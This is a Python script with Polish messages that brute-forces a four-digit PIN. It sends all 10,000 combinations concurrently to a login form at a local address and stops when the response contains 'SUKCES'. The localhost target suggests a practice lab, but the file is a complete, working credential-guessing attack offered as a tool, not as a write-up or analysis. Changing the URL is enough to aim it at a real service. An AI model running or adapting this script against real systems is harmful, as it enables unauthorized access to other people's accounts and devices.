import asyncio
import httpx
import time
import sys

URL = "http://127.0.0.1:5000/"  


completed_attempts = 0

async def try_pin(client, pin, semaphore, total_tasks):
    global completed_attempts
    formatted_pin = f"{pin:04d}"

    async with semaphore:
        try:
            response = await client.post(URL, data={"pin": formatted_pin})

            
            completed_attempts += 1

            
            sys.stdout.write(
                f"\r[-] Próba: {completed_attempts}/{total_tasks} (Sprawdzam: {formatted_pin})"
            )
            sys.stdout.flush()

            if "SUKCES" in response.text:
                
                sys.stdout.write("\r" + " " * 60 + "\r")
                print(f"[+] ZNALEZIONO PIN: {formatted_pin}")
                return formatted_pin

        except Exception:
            pass

    return None

async def main():
    global completed_attempts
    completed_attempts = 0  

    
    sem = asyncio.Semaphore(105)
    total_pins = 10000

    start_time = time.time()

    async with httpx.AsyncClient() as client:
        
        tasks = [try_pin(client, pin, sem, total_pins) for pin in range(total_pins)]

        
        results = await asyncio.gather(*tasks)

    
    found_pins = [r for r in results if r is not None]

    duration = time.time() - start_time

    
    print("")

    if found_pins:
        print(f"Sukces! Poprawny PIN to: {found_pins[0]}")
    else:
        print("Nie znaleziono poprawnego PIN-u.")

    print(f"Całość zajęła: {duration:.2f} sekund!")


if __name__ == "__main__":
    asyncio.run(main())